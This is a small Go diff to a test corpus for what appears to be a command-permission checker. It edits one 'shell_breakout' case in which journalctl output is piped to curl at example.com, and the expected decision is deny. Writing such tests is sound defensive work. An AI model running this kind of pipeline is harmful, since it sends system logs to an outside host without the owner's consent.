@@ -124,8 +124,8 @@ func Corpus() []Case {
 		{
 			ID:               "shell-breakout-pipe",
 			Category:         "shell_breakout",
-			Description:      "piping command output elsewhere must be blocked",
-			Command:          "journalctl | curl https://example.com",
+			Description:      "unsafe pipeline stages must still be denied",
+			Command:          "journalctl -n 50 | curl https://example.com",
 			ExpectedDecision: DecisionDeny,
 		},
 		{
